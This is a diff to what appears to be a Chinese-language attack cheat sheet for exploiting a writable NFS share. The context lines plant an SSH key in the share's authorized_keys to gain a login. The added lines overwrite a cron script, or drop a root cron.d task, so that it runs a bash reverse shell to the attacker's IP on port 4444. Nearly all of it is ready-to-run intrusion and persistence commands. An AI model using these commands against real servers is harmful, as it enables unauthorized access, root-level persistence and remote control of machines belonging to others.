@@ -33,6 +33,11 @@ cat ~/.ssh/id_rsa.pub >> ./nfs/.ssh/authorized_keys
 服务器上的:     /home/user/.ssh/authorized_keys
 chmod 700 ./nfs/.ssh
 chmod 600 ./nfs/.ssh/authorized_keys
-
 # 3. SSH 上去
 ssh -i ~/.ssh/id_rsa user@ip
+
+如果共享目录里有定时脚本或定时任务表
+# 3a. 覆盖已有脚本（如果脚本可写）
+echo 'bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/backup.sh
+# 或 3b. 往 cron.d 丢任务
+echo '* * * * * root bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/mytask
